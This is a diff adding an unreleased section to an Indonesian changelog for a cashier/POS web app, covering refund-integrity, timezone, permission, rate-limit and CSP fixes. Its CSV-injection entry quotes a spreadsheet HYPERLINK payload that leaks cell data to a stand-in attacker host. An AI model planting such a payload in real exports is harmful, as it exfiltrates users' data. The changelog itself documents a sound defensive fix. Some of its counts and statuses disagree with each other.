@@ -3,6 +3,248 @@
 Format mengikuti [Keep a Changelog](https://keepachangelog.com/id/), nomor versi mengikuti
 [Semantic Versioning](https://semver.org/lang/id/). Tanggal memakai zona waktu toko (Asia/Jakarta).
 
+## [Unreleased]
+
+Belum dirilis. Bagian ini menggabungkan tiga rangkaian pekerjaan:
+
+1. **Higienis repositori** — CI, lisensi, konfigurasi lingkungan, dan sinkronisasi dokumen yang
+   menyimpang dari kode.
+2. **Sprint 0 hasil analisis putaran 2** — perbaikan cepat dari
+   [`docs/11-analisis-2026-09-17.md`](docs/11-analisis-2026-09-17.md) (15 temuan yang diverifikasi
+   dengan menjalankan aplikasi). Temuan integritas data sisanya (zona waktu sisi laporan) dijadwalkan di Sprint 1.
+3. **Perbaikan tombol "Masuk"** pada layar login.
+4. **Perbaikan integritas retur** dari analisis `docs/11`: pagar retur berulang (#1), snapshot konsumsi per baris (#2),
+   dan `forceConsumeRaw` yang akhirnya dihormati mesin BOM (#3).
+5. **Sisa Sprint 1/2 `docs/11`**: zona waktu toko (#4), permission per blok setting (#7), CSV formula injection (#8),
+   dan satu rumus kapasitas yang menghormati `yield_pct` (#11).
+6. **Penutup Sprint 2 `docs/11`**: produksi aman-jujur (#10), katalog realtime (#15), dan sinkronisasi dokumen (#14).
+
+### Ditambahkan
+
+- **8 tes regresi zona waktu (6) & temuan Sprint 2 (4 tes API)** — 67 → **77 tes**: `server/tests/datetime.test.js`
+  (offset & hari bisnis, fallback zona ngawur, `addDays`, cache zona toko, nomor struk per zona) dan 4 tes API
+  (zona waktu laporan + nomor struk + filter tanggal; permission per blok setting; netralisasi CSV; satu rumus kapasitas).
+  Keempatnya dijalankan terhadap kode lama → **4 failing**, membuktikan tesnya menangkap bug.
+- **Katalog realtime (#15)** — `server/src/catalog.js` (`catalogVersion()` = sha1 12 karakter dari hitungan
+  item/resep/addon/pajak/diskon/metode/kategori; **angka stok sengaja dikecualikan** karena stok berubah terus),
+  `GET /api/bootstrap/lite` (≥5× lebih kecil dari `/bootstrap` penuh), dan `GET /api/events` (Server-Sent Events:
+  `hello` + `catalog_version` saat tersambung, event `stock` tiap `postMovement`, heartbeat 25 s, `retry: 5000`).
+- **Bus event in-process** `server/src/events.js` — `subscribe`/`publish` + `beginBatch`/`commitBatch`/`abortBatch`,
+  sehingga event hanya keluar **setelah transaksi COMMIT**; `postMovement` menjadi satu-satunya pemancar sinyal stok.
+- **`server/tests/runtime.test.js` (6 tes)** — menguji perilaku boot server sebagai *proses/siklus hidup*
+  (pagar produksi), bukan sekadar fungsi: ini lapisan yang selama ini tidak punya tes.
+- **2 tes API #15** — `bootstrap/lite` jauh lebih kecil & versi katalog stabil saat opname stok namun berubah
+  saat katalog berubah; klien SSE menerima `hello` + `stock` tanpa polling, sedangkan `POST /stock/produce`
+  yang gagal 409 tidak memancarkan event (bukti batching commit).
+- **6 tes regresi snapshot BOM & `forceConsumeRaw`** (61 → **67 tes**): 4 di `server/tests/stock.test.js`
+  (mesin BOM memotong bahan walau stok jadi ada; retur memakai snapshot walau resep diubah; retur produk
+  `make_to_order` mengembalikan bahan; data lama tanpa snapshot tetap bisa diretur) dan 2 di
+  `server/tests/api.test.js` (jejak audit `items[].bom` + retur pasca-perubahan resep; `/items/:id/simulate`
+  & retur menghormati `forceConsumeRaw`). Tiga tes domain yang bergantung pada snapshot dijalankan terhadap
+  `sales.js` versi lama → **3 failing** (17 passing), membuktikan tesnya menangkap bug.
+
+- **CI GitHub Actions** (`.github/workflows/ci.yml`): dua job pada setiap push & pull request —
+  `check` (uji unit backend + smoke UI jsdom + build SPA, artefak `client/dist` diunggah) dan
+  `qa` (simulasi 400 transaksi, uji RBAC & pemindaian kolom rahasia). Memakai `npm ci` dengan cache
+  npm dan versi Node dari `.nvmrc`. Sebelumnya dokumen menyebut "dipakai di CI" padahal tidak ada
+  workflow sama sekali. (docs/11 §12)
+- **6 tes regresi API** (`server/tests/api.test.js`, 51 → 57 tes): alur order tertahan
+  (tahan → daftar → lanjutkan → hapus + 404), nomor hold unik, RBAC `sale.hold`, header CSP,
+  brute force dengan XFF palsu (ember per-username), dan `KASIR_TRUST_PROXY=false` membuat XFF
+  diabaikan (ember per-IP). Tes-tes inilah yang membuat bug `storeId is not defined` tidak bisa lolos lagi.
+- Variabel lingkungan baru: **`KASIR_TRUST_PROXY`**, **`KASIR_LOGIN_LIMIT_IP`**, dan
+  **`KASIR_LOGIN_LIMIT_USER`** — didokumentasikan di `.env.example`, `docs/04` §2, dan `docs/09` §4.
+- **`LICENSE`**: lisensi source-available (seluruh hak dilindungi) yang menyatakan secara eksplisit
+  apa yang boleh (membaca, mempelajari, menjalankan untuk operasional toko sendiri) dan apa yang
+  memerlukan izin tertulis (menyalin, memodifikasi, menyebarkan, memakai sebagai layanan pihak ketiga),
+  beserta penyangkalan jaminan. README bagian Lisensi diperbarui agar mengarah ke berkas ini.
+- **`.env.example`**: seluruh variabel lingkungan yang benar-benar dibaca kode (runtime, keamanan,
+  pengembangan/uji, platform) dengan nilai produksi yang disarankan — termasuk catatan bahwa aplikasi
+  sengaja tidak memuat `.env` otomatis (tanpa `dotenv`), jadi harus lewat `--env-file`, ekspor shell,
+  atau `EnvironmentFile` systemd.
+- **`.nvmrc`** (`22`) dan **`.editorconfig`** (UTF-8, LF, 2 spasi, baris maksimum 140) sebagai
+  kesepakatan versi & format dasar antar editor.
+
+### Diperbaiki
+
+- **Zona waktu: `stores.timezone` akhirnya dipakai** (temuan P0 #4). Dulu `created_at` disimpan UTC tetapi
+  semua batas hari dihitung dari UTC atau `localtime` **server**, sehingga pada VPS/Vercel ber-TZ UTC:
+  transaksi 00:00–06:59 WIB masuk ke tanggal sebelumnya (hilang dari "hari ini"), grafik jam sibuk geser
+  7 jam, dan nomor struk berganti hari pukul 07:00 WIB. Modul baru `server/src/lib/tz.js`
+  (`businessDay`, `businessHour`, `tzOffsetSql`, `dayBoundsUtc`, `storeTimezone` + cache yang dibuang saat
+  zona waktu disunting) sekarang menjadi satu-satunya sumber hari bisnis:
+  - laporan (`/reports/*`): rentang default 30 hari **bisnis toko**, `date(created_at, '+07:00')`, `by_hour`
+    memakai jam toko, tanggal proyeksi kehabisan juga;
+  - nomor struk & nomor PO memakai hari bisnis toko, bukan tanggal UTC;
+  - filter tanggal `GET /api/sales` & `GET /api/stock/movements`: `YYYY-MM-DD` dari UI = hari toko;
+  - zona waktu tidak dikenal (salah ketik di Pengaturan) jatuh ke `Asia/Jakarta`, tidak mematahkan laporan.
+  **Bukti**: struk pukul 01:00 WIB masuk hari WIB-nya dengan `by_hour = [1]` (bukan `[18]`) dan 0 struk di
+  tanggal UTC-nya; 6 tes baru di `server/tests/datetime.test.js` (5 di antaranya gagal di kode lama).
+- **Permission per blok setting tidak ditegakkan** (temuan P1 #7). `PUT /api/settings/:key` digerbangi
+  `setting.store` **plus** klausa `|| perms.includes('setting.store')` yang selalu benar, sehingga pemilik hak
+  profil toko bisa menurunkan PPN (`setting.tax`) atau mengganti tema (`setting.theme`). Kini rute menerima
+  keempat hak `setting.*` dan peta blok→permission yang memutuskan. **Bukti**: role `manager` ber-`setting.store`
+  saja → `PUT /settings/tax` & `/settings/theme` & `/settings/receipt` = **403**, `/settings/store` = 200, PPN tetap 11%.
+- **CSV formula injection pada ekspor laporan** (temuan P1 #8). `customer_name`/`note` diisi bebas di layar kasir;
+  nilai seperti `=HYPERLINK("http://evil.example/?c="&A1,"Klik")` dulu diekspor apa adanya dan **dieksekusi**
+  spreadsheet. `csvCell()` kini memberi awalan apostrof untuk teks yang dimulai `=`, `+`, `-`, `@`, TAB, atau CR,
+  sementara nilai bertipe angka tetap numerik (kolom uang & laba tidak berubah).
+- **Dua dari tiga rumus kapasitas mengabaikan `yield_pct`** (temuan P2 #11). `items.js#maxServable()` dan
+  `stockhealth.js#rawCapacity()` menulis ulang rumus tanpa membagi `yield_pct`, jadi `/items/:id/simulate` dan
+  `serve_capacity`/status alert **dua kali lebih optimis** dari mesin stok untuk produk ber-yield < 100%.
+  Sekarang keduanya memakai `bom.js#rawCapacity()` (satu rumus; resep dimuat sekali, tanpa N+1) dan
+  `yield_pct` di luar 1–100 ditolak **400** saat membuat/menyunting barang (dulu di-clamp diam-diam).
+  **Bukti**: resep 10 gr, `yield_pct = 50`, stok bahan 1.000 gr → katalog/simulate/health sama-sama **50 porsi**
+  (sebelumnya 50/100/100).
+- **Retur memakai resep *hari ini*, bukan yang benar-benar terpotong saat jual** (temuan P0 #2 di
+  [`docs/11`](docs/11-analisis-2026-09-17.md)). Dulu `refundLine()` menghitung ulang dengan `planStockImpact`
+  memakai resep & `cost_price` **saat retur**, walaupun teks di UI menjanjikan snapshot. Karena resep/harga
+  bahan rutin berubah di F&B, stok yang kembali bisa berbeda jauh dari yang terpotong (dan selisihnya tidak
+  terlacak karena retur tidak membalik gerakan asli).
+  - **Snapshot konsumsi per baris**: `createSale()` menyimpan hasil `planStockImpact` baris itu ke kolom baru
+    `transaction_items.bom_json` (`{finished:[{item_id,qty}], raw:[{item_id,qty}]}`) di dalam transaksi yang sama.
+  - `refundLine()` membalikkan **tepat** snapshot tersebut, diskalakan `f = qty_retur / qty_baris`.
+    **Bukti**: jual 2 porsi (resep 30 gr → bahan terpotong 60 gr), resep lalu dinaikkan jadi 90 gr/porsi,
+    retur 2 porsi → stok kembali **60 gr** (cara lama: 180 gr, tiga kali lipat).
+  - Data lama (`bom_json` `NULL`) tetap bisa diretur dan jatuh ke perhitungan ulang; gerakan stoknya bertanda
+    `Retur BOM (tanpa snapshot) …` supaya bisa dibedakan saat audit.
+  - `GET /api/sales/:id` menyajikan jejak auditnya sebagai `items[].bom`; `POST /receipt/preview` tidak
+    ikut membocorkan kolom internal ini. Kolom bersifat **aditif** (`migrateSchema()`), diuji dengan DB
+    berskema lama: `[db] migrasi aditif diterapkan: transaction_items.bom_json`, data lama utuh.
+- **`forceConsumeRaw` diabaikan mesin BOM** (temuan P0 #3, kode mati). `planStockImpact()` menerima parameter
+  itu dari tiga pemanggil tetapi tidak pernah memakainya, sehingga niat "paksa potong bahan baku" tidak pernah
+  terjadi: pada penjualan/retur produk `make_to_order` yang kebetulan punya stok jadi, yang dipotong/dikembalikan
+  adalah **barang jadi**, bukan bahan baku yang benar-benar terpakai. Kini
+  `fromStock = forceConsumeRaw ? 0 : Math.min(qty, …)`, sehingga `/api/items/:id/simulate` kembali menampilkan
+  `deduct_raw` (bukan `deduct_finished`) dan jalur cadangan retur mengembalikan bahan seperti niat semula.
+- **Retur bisa diulang tanpa batas → stok bahan baku digandakan** (temuan P0 #1 di
+  [`docs/11`](docs/11-analisis-2026-09-17.md), analisis Sprint 1). `refundLine()` hanya membatasi `qty`
+  terhadap qty baris asli, jadi memanggil retur berulang-ulang mengembalikan stok yang sama setiap kali
+  dan uang yang dikembalikan tidak pernah tercatat. **Bukti sebelum perbaikan** (struk `KS20260926-1330`,
+  baris qty 2): tiga retur berturut-turut semuanya `HTTP 200`, stok naik fiktif (Biji Kopi House Blend
+  +110,16 gr padahal hanya 36,72 gr yang terpakai; Cup +6 pcs; Es Batu +777,6 gr), status struk tetap
+  `completed`, dan laporan tetap menghitung struk itu penuh.
+  - Skema: `transaction_items.refunded_qty` (pagar per baris) + `transactions.refund_total` & `refund_cost`
+    (uang & HPP yang dikembalikan). Ketiganya **aditif** dan otomatis ditambahkan ke DB lama lewat
+    `migrateSchema()` di `server/src/db/index.js` — diuji dengan DB berskema lama: kolom muncul, data lama utuh.
+  - `refundLine()` menolak `409` bila qty melebihi sisa (`qty − refunded_qty`) atau baris sudah diretur penuh;
+    permintaan yang ditolak tidak menyentuh stok sama sekali. Retur mencatat `refund_amount` (proporsional
+    terhadap tagihan, ikut bagian pajak/biaya/pembulatan, tidak pernah melebihi `grand_total`) dan
+    `refund_cost`; bila **semua** baris sudah penuh, status struk menjadi `refunded`.
+  - `voidSale()` **menolak** membatalkan struk yang sudah punya retur (`409`) — pembatalan membalikkan seluruh
+    potongan asli, sehingga stok yang sudah kembali akan dikembalikan dua kali.
+  - Laporan `GET /api/reports/summary`: omzet/HPP/laba kotor dihitung neto setelah retur (harian, per jam,
+    per barang, per kasir), `by_item` menampilkan qty & omzet neto, CSV penjualan memuat `refund_total`, dan
+    `totals.refund_total` + `totals.refunded` tersedia untuk dasbor.
+  - UI Riwayat: modal retur menampilkan **sisa yang masih bisa diretur** per baris, menyembunyikan pilihan yang
+    sudah penuh, dan mentokkan input pada sisa; detail struk menampilkan nilai retur.
+  - Tes: **+4 tes regresi** (57 → 61) — tiga di `server/tests/stock.test.js` (domain: retur berulang ditolak &
+    stok tidak berubah, retur sebagian mencatat uang/HPP proporsional, void setelah retur ditolak) dan satu di
+    `server/tests/api.test.js` (HTTP: `409` saat melebihi sisa, `refund_amount`, omzet laporan neto,
+    `status='refunded'`, void ditolak). Ketiga tes domain **gagal pada kode lama** (diverifikasi), jadi bug ini
+    tidak bisa lolos lagi.
+  - Sisa yang belum dikerjakan (docs/03 §5): status tersendiri untuk retur sebagian (butuh membangun ulang
+    CHECK `transactions.status`), tabel `refunds`, dan baris uang keluar di `transaction_payments`.
+- **`POST /api/pos/hold` selalu 500** (`storeId is not defined` di `server/src/routes/pos.js`) → fitur
+  *order tertahan* hidup kembali: keranjang kosong ditolak 400, nomor hold dijamin unik terhadap
+  `uq_tx_invoice` (dua kasir menahan pada detik yang sama tidak lagi bertabrakan), aksi dicatat ke
+  `audit_logs` (`sale.hold`), dan `GET /api/pos/held` mengembalikan `customer_name` alih-alih JSON mentah
+  di kolom `note`. (docs/11 §5)
+- **Pembatas login bisa dilewati `X-Forwarded-For` palsu** — `app.set('trust proxy', true)` mempercayai
+  header kiriman klien sehingga brute force tak terbatas (PIN 4 digit!). Kini `trust proxy` default
+  `'loopback'` dan dapat disetel lewat `KASIR_TRUST_PROXY` (`false|1|2|loopback|uniquelocal|CIDR`),
+  ditambah **ember per-username** (`KASIR_LOGIN_LIMIT_USER`, default 8/60 detik) yang tidak bisa diakali
+  dengan mengganti IP. Peta bucket dibatasi (`MAX_BUCKETS` + penyapuan berkala) agar XFF acak tidak
+  menjadi DoS memori. (docs/11 §6)
+- **CSP `frame-ancestors *` → `'self'`** + `object-src 'none'`: aplikasi kasir tidak bisa lagi dibingkai
+  situs lain (clickjacking pada tombol bayar/void). (docs/11 §9)
+- **Riwayat seed bertanggal "masa depan"** — `server/scripts/seed.js` menulis stempel dari komponen waktu
+  lokal sementara runtime menulis UTC, sehingga 67 baris seed menggeser `ORDER BY created_at DESC` dan
+  menyembunyikan gerakan stok terbaru dari `GET /api/stock/movements?limit=60`. Seed kini menulis UTC
+  (jam bisnis 08:00–20:00 WIB) dan menarik mundur apa pun yang melewati waktu seed; urutan ledger memakai
+  `rowid` sebagai pemecah seri (stempel hanya presisi 1 detik, `id` acak). (docs/11 §4 bagian seed/urutan)
+- **Smoke UI membocorkan proses server** — `client/tests/ui-smoke.entry.jsx` memanggil `process.exit()`
+  sendiri sehingga runner mati sebelum `cleanup()`: server anak jadi orphan di port 4399 dan run berikutnya
+  diam-diam menguji DB kotor. Entry kini mengekspor `smokeFails`; runner membersihkan (`SIGTERM`+`SIGKILL`
+  dan `process.on('exit')`) lalu keluar dengan kode yang benar. (docs/11 §13)
+- **Tombol "Masuk" di layar login tidak berfungsi** (ditemukan saat penelusuran kode). Komponen
+  `Button` mengunci `type="button"`, sehingga `<button>` di dalam `<form onSubmit={submit}>` tidak
+  pernah men-submit apa pun: mengklik "Masuk" tidak melakukan apa-apa — tanpa request dan tanpa pesan
+  error — dan hanya tombol Enter yang bisa masuk. Ini bug di layar pertama aplikasi yang dilihat kasir.
+  Perbaikan: `Button` menerima prop `type` (default `'button'`, pemakai lain tidak berubah) dan tombol
+  "Masuk" memakai `type="submit"`. Ditambah tes regresi di smoke UI (isi username/kata sandi → klik
+  "Masuk" → pastikan shell muncul) yang sudah diverifikasi **gagal tanpa perbaikan** (2 assertion merah)
+  dan lulus setelahnya.
+
+### Diperbaiki (dokumentasi)
+
+- README & `docs/01`: **Express 4 → Express 5** (yang terpasang 5.2.1; komentar di `server/src/index.js`
+  sejak awal sudah menulis Express 5).
+- `docs/01` §2: daftar middleware menyebut `cors` dan `multer` yang **tidak pernah terpasang**.
+  Diganti dengan keadaan sebenarnya: satu-satunya dependensi produksi adalah `express`; `react`, `vite`,
+  `concurrently`, `esbuild`, `jsdom` hanya dipakai saat build/uji.
+- `docs/01` §3: deskripsi `server/src/index.js` menyebut `express.json({limit:'8mb'})` (aslinya `12mb`),
+  `cors`, dan fungsi `initDb()` yang tidak ada. Kini mencantumkan header keamanan, `/api/health`,
+  `/api/openapi.json`, fallback SPA, dan penegasan tidak ada `cors`/`initDb()`.
+- `docs/01` §2: isi token diklaim `userId, storeId, branchId, role, pin, exp`; aslinya hanya
+  `{ uid, role, sid, iat, exp }` — `branchId` dan permission dibaca ulang dari DB tiap permintaan.
+- `docs/01` §5: default `KASIR_DATA_DIR` ditulis `server/data` (aslinya `server/src/data`),
+  `KASIR_JWT_SECRET` diklaim "rahasia dev tetap di kode" (aslinya dibangkitkan & disimpan ke
+  `.jwt-secret` mode 0600), dan `KASIR_TOKEN_TTL` ditulis `12h` (aslinya detik: `43200`).
+- `docs/01` §6: klaim "uang selalu integer Rupiah" diperjelas — nilainya dibulatkan, tetapi kolomnya
+  bertipe `REAL` di SQLite.
+- `docs/01` §7: klaim **"`POST /api/stock/transfer` sudah tersedia"** dihapus — endpoint itu tidak ada.
+  Diganti dengan keadaan sebenarnya (stok belum dipisah per cabang, laporan belum bisa difilter cabang,
+  `transfer` masih nilai CHECK yang belum pernah ditulis) beserta arah perbaikannya.
+- `docs/02`: nilai `movement_type` `transfer` ditandai sebagai cadangan yang belum diimplementasikan.
+- README baris "Migrasi skema": ditambahkan peringatan bahwa belum ada migrasi bertahap
+  (`PRAGMA user_version` tidak dipakai), sehingga menambah kolom pada rilis berikutnya tidak mengubah
+  DB lama yang sudah berisi data.
+- `docs/10` §1: baris "belum (v0.2+)" dilengkapi dengan celah yang belum tercatat — alur pindai barcode,
+  split payment, cetak ESC/POS langsung, master pelanggan/poin, dan shift kas.
+- `docs/10` §2: ditambahkan **"Risiko teknis yang diketahui (per 26 Sep 2026)"** — zona waktu toko yang
+  belum diterapkan pada perhitungan tanggal (laporan harian, nomor struk, filter `from`/`to`),
+  ketiadaan migrasi skema bertahap, kolom uang `REAL`, status multi-cabang, dan dua advisory dependensi
+  dev (`esbuild`/`vite`).
+
+### Diubah
+
+- **Klien: polling berat 45 detik per tab dihapus (#15).** `client/src/store.jsx` kini memakai
+  `GET /api/bootstrap/lite` (45 s) dan hanya memuat `/bootstrap` penuh bila `catalog_version` berubah;
+  `client/src/features/pos/PosPage.jsx` menarik stok karena **event** (`app.stockRev`, throttle 2,5 s) dengan
+  interval cadangan 60 s/300 s, sehingga satu tab POS tidak lagi membanjiri API.
+- **SSE memakai `fetch` + `getReader()`, bukan `EventSource`** — `EventSource` tidak dapat mengirim header,
+  dan token di query string akan bocor ke log/URL; di klien, stream dibuka ulang dengan backoff 2 s → 30 s.
+- **Produksi aman-jujur (#10).** `NODE_ENV=production` tanpa `KASIR_JWT_SECRET` → server **gagal start**
+  (`assertJwtSecret()` dipanggil dari `createApp()`/`api/index.js`, **bukan** saat modul `auth.js` dimuat,
+  agar `npm run seed` di produksi tetap berjalan); auto-seed demo hanya dengan `KASIR_AUTOSEED=1` dan
+  ditolak di produksi; seed manual di produksi butuh `KASIR_ALLOW_SEED=1`. README/`docs/09` §10 menyatakan
+  Vercel = **demo/pratinjau UI** (`/tmp` ephemeral & per-instance) beserta env yang wajib diisi.
+- **Sinkronisasi dokumen (#14).** Jumlah indeks "16" → **19** (16 `CREATE INDEX` + 3 `CREATE UNIQUE INDEX`,
+  dicocokkan dengan `sqlite_master` DB hasil seed), klaim lama `Express 4`/`cors`/`multer` dibersihkan,
+  `DATA_DIR` default `server/src/data`, komentar deduplikasi alert 24 → **6 jam** (sesuai kode), dan
+  `docs/08` §7 baru mencatat angka tes yang berlaku (85 / 32 langkah / 20 QA) agar klaim `57/57` & `28/28`
+  di §3 terbaca sebagai catatan historis.
+- **`server/src/db/index.js`** — `tx()` mengumpulkan event di dalam batch dan baru mem-`publish` setelah commit
+  (abort = tidak ada event).
+- `docs/09` §10 dan README: **Vercel ditandai sebagai jalur demo/pratinjau**, produksi = VPS/systemd
+  (SQLite di `/tmp` sementara & per-instance, rahasia JWT hilang tiap cold start, auto-seed menaruh
+  kredensial demo publik). Perubahan kode untuk menutup auto-seed dijadwalkan di Sprint 2. (docs/11 §10)
+- Dokumentasi disinkronkan untuk bagian yang tersentuh putaran ini: jumlah tes (docs/08, docs/09, docs/10),
+  CSP & pembatas login (docs/04), hasil putaran verifikasi ketiga (docs/08 §3).
+- **Migrasi skema aditif**: kolom baru sekarang didaftarkan di `ADDITIVE_COLUMNS` (`server/src/db/index.js`)
+  dan ditambahkan otomatis ke DB lama saat boot (`ALTER TABLE … ADD COLUMN`, idempoten). Ini menutup sebagian
+  celah "belum ada migrasi" — perubahan yang membangun ulang tabel (ubah CHECK/hapus kolom/backfill) tetap
+  perlu langkah rilis bernomor versi. Dokumen disinkronkan: README, `docs/01` §3/§7, `docs/02` §5, `docs/09` §8.
+
+### Diketahui / belum
+
+- **Migrasi skema bernomor versi** (rollback/backfill/rebuild tabel) dan **shift kas** belum ada; urutan prioritasnya ada di `docs/10` §2.
+- **Sprint 1/2 (rencana, tercantum di `docs/11`)**: ~~retur berulang~~, ~~snapshot retur~~, ~~`forceConsumeRaw`~~,
+  ~~zona waktu laporan~~, ~~permission per blok setting~~, ~~CSV injection~~, ~~rumus kapasitas `yield_pct`~~ — semuanya
+  sudah diperbaiki. Sisa Sprint 2: gating auto-seed Vercel (#10), `/bootstrap/lite` + SSE stok (#15),
+  dan sinkronisasi dokumen sisa (#14).
+
 ## [0.1.0] — 2026-09-16
 
 Rilis internal: Fase 1–3 terimplementasi sebagai kode berjalan, Fase 4 berupa rangkaian uji + dokumen
@@ -11,13 +253,13 @@ Rilis internal: Fase 1–3 terimplementasi sebagai kode berjalan, Fase 4 berupa 
 ### Ditambahkan
 
 **Fase 1 — fondasi**
-- Skema SQLite relasional (`server/src/db/schema.sql`): 21 tabel + view `v_stock_health` + 16 indeks;
+- Skema SQLite relasional (`server/src/db/schema.sql`): 21 tabel + view `v_stock_health` + 19 indeks (16 biasa + 3 unik; entri ini awalnya salah menulis 16);
   pemisahan `items.item_type` (`raw` vs `finished`) + `item_recipes` (BOM banyak-ke-banyak, `waste_pct`, `is_optional`)
   + `item_addons` (topping berbayar yang ikut memotong bahan) + ledger `stock_movements` (`balance_after`, `ref_type/ref_id`, `voided`).
 - Desain UI modular berbasis token: `settings.theme` (10 token warna, mode terang/gelap, radius, kerapatan, font, lebar sidebar,
   pola latar, nama aplikasi, logo) + `theme.menu` (urutan, label, ikon, visibilitas, permission per menu) — diubah dari
   layar Pengaturan tanpa rebuild/restart.
-- Stack & infrastruktur: Node.js 22 + Express 4 + `node:sqlite` (tanpa dependensi native), React 18 + Vite,
+- Stack & infrastruktur: Node.js 22 + Express 5 + `node:sqlite` (tanpa dependensi native), React 18 + Vite,
   SPA dilayani satu proses; `client/vite.config.js` mem-proxy `/api` ke port `PORT`.
 
 **Fase 2 — MVP kasir**
